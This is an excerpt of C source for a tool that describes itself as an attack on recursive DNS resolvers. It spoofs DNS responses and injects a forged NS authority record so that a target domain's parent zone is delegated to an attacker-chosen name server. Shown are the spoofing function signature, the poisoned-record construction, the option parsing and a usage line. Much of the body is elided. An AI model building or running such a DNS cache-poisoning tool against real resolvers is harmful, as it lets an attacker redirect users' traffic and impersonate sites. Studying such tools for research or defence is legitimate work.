/*
    Attack tool for recursive (Poisoning NS).
*/
...
char*        g_poison_ip                    = "1.2.3.4";    // Res IP in spoofed response.
...
static void spoof_dns_resp(int sockfd, char* src_ip, char* dst_ip, uint16_t dst_port,
    ...
    authori[0] = new_dns_answer_ns(domain_uplevel(domain_name), res_ns, RES_TTL);
...
int main(int argc, char** argv) {
    ...
    char* poisoned_ns = NULL;
    int verbos = FALSE;

    while ((ch = getopt(argc, argv, "i:o:s:u:d:n:v")) != -1) {
        switch (ch) {
        case 'i':
            recur_ip_in = optarg;
            break;
    ...
    if (recur_ip_in == NULL || recur_ip_out == NULL || scan_src_ip == NULL || ns_server_ip_list == NULL
            || domain_poisoned == NULL || poisoned_ns == NULL) {
        printf("Usage:\n");
        printf("./attack_recur -i <recur_ip_in> -o <recur_ip_out> -s <scan_src_ip> -u <ns_server_ip>:<ns_server_ip> -d <domain_poisoned> -n <poisoned_ns> [-v]\n");
        return 1;
    }
